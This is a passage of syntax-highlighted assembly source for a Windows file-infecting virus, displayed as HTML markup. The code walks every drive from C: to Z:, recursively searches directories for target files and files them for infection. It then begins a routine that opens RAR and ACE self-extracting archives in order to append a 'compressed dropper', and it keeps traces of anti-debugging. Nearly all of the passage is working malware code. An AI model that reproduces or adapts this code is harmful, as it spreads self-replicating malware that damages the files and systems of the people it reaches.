        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">init_search_error</span><span class="sc0">   </span><span class="sc1">;were we sucessful ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">005C3A43h</span><span class="sc0">       </span><span class="sc1">;'C:\\0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__searching</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_all_dirs</span><span class="sc0">
    </span><span class="sc5">__searching_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">init_search_done</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">005Ch</span><span class="sc0">

        </span><span class="sc1">; what disk is it ? fixed ? cd-rom ? ram-disk ? etc. ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">;convert to BCD</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt_flags</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__searching</span><span class="sc0">     </span><span class="sc1">;may I "use" this disk ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__searching_end</span><span class="sc0">     </span><span class="sc1">;uaaaaah, i'm crazy... :)</span><span class="sc0">

</span><span class="sc5">init_search_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">        </span><span class="sc1">;deallocate memory</span><span class="sc0">

</span><span class="sc5">init_search_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                </span><span class="sc1">;restore all regz</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">init_search_done</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;all disks infected?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hookHyperInfection_Done</span><span class="sc0"> </span><span class="sc1">;remove timer</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">init_search_exit</span><span class="sc0">

</span><span class="sc5">search_all_dirs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperTable</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">search_all_dirs_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__add_filename</span><span class="sc0">      </span><span class="sc1">;add filename or extension</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">       </span><span class="sc1">;offs dta in mem to esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindFirst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save handle</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__find_dir</span><span class="sc0">      </span><span class="sc1">;error ?</span><span class="sc0">

    </span><span class="sc5">__repeat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;delete extension</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_filename</span><span class="sc0">  </span><span class="sc1">;and add file name</span><span class="sc0">
        </span><span class="sc5">@copysz</span><span class="sc0">             </span><span class="sc1">;copy with zero char</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;restore esi=dta in memory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">__final_SoftICE_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;        int     4           ;final SoftICE breakpoint</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;input value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">       </span><span class="sc1">;this was ghastly bug !</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;call function</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time.wSecond</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;give time other appz</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetSystemTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_table</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;position in HyperTable</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time.wSecond</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;out of time ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">init_search_error</span><span class="sc0">

    </span><span class="sc5">__continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">       </span><span class="sc1">;esi=dta in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;handle of FindFirstFile</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindNext</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__repeat</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindClose</span><span class="sc0">

     </span><span class="sc5">__find_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;remove file name/extension</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">;last file name ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">search_all_dirs_continue</span><span class="sc0">

     </span><span class="sc5">__find_dir_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">002A2E2Ah</span><span class="sc0">     </span><span class="sc1">;add '*.*',0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindFirst</span><span class="sc0">       </span><span class="sc1">;search directory "only"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__search_exit</span><span class="sc0">

 </span><span class="sc5">__find_in_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_fileattr</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">  </span><span class="sc1">;is it directory ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__find_next</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_filename</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">  </span><span class="sc1">;it can't be directory</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__find_next</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">     </span><span class="sc1">;edi=last char of filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_filename</span><span class="sc0">  </span><span class="sc1">;esi=filename</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;remove extension</span><span class="sc0">

        </span><span class="sc5">@copysz</span><span class="sc0">             </span><span class="sc1">;copy directory name and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">005Ch</span><span class="sc0">  </span><span class="sc1">;set '\' at the end</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_all_dirs</span><span class="sc0">     </span><span class="sc1">;search in new directory</span><span class="sc0">

    </span><span class="sc5">__find_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindNext</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__find_in_dir</span><span class="sc0">

  </span><span class="sc5">__search_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;remove file name and '\'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">;it's out of directory</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__searching_end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__find_next</span><span class="sc0">

  </span><span class="sc5">__calc_in_mem</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;get pointer to dta in memory</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">__add_filename</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;add f.n. or ext by HyperTable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;only extension ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__af_fullcopy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;load extension</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">2Ah</span><span class="sc0">  </span><span class="sc1">;'*'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;and extension</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">;zero byte</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">HyperTable_OneSize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
            </span><span class="sc5">HyperTable_HalfSize</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc1">;search this extension ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__aff_finish</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__find_dir</span><span class="sc0">
    </span><span class="sc5">__aff_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__af_fullcopy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;load filename's char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;end of filename ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__af_fullcopy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">HyperTable_HalfSize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc1">;+1 means zero byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
            </span><span class="sc5">HyperTable_HalfSize</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc1">;search this filename ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__aff_finish</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__find_dir</span><span class="sc0">

</span><span class="sc5">__get_last_char</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;edi=last char+1 in filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__clean</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;clean last item in filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">
        </span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in ACE/RAR and ACE/RAR EXE-SFX archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function scans input EXE  file whether it is not SFX</span><span class="sc0">
        </span><span class="sc1">;for RAR (Dos,W32) or for ACE (Dos,Win32 - German/English)</span><span class="sc0">
        </span><span class="sc1">;If yes, I will put compressed dropper in the end of file.</span><span class="sc0">
        </span><span class="sc1">;Why that ? See on "infect_ACE:" comment for more info.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__iSFX_fHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file's handle</span><span class="sc0">
        </span><span class="sc5">__iSFX_fMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file's headers</span><span class="sc0">
        </span><span class="sc5">__iSFX_nCompare</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;comparing places</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_ACE_RAR</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; open input file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iSFX_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; allocate memory for comparing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; we must search certain bytes on certain file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">     </span><span class="sc1">;six! comparing</span><span class="sc0">
    </span><span class="sc5">__iSFX_search_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iSFX_sEnd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_MagicWhere</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__iSFX_magic_okay</span><span class="sc4">:</span><span class="sc0">
